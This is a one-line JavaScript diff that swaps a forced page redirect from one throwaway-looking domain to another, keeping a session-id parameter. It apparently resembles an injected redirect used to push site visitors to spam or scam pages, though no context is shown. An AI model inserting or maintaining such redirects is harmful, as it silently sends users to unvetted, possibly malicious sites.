@@ -1,1 +1,1 @@
-window.location.href = "https://verbalisat.sbs/ogXi/go?sid=7747";
+window.location.href = "https://piosity.top/NPFMm/go?sid=7747";
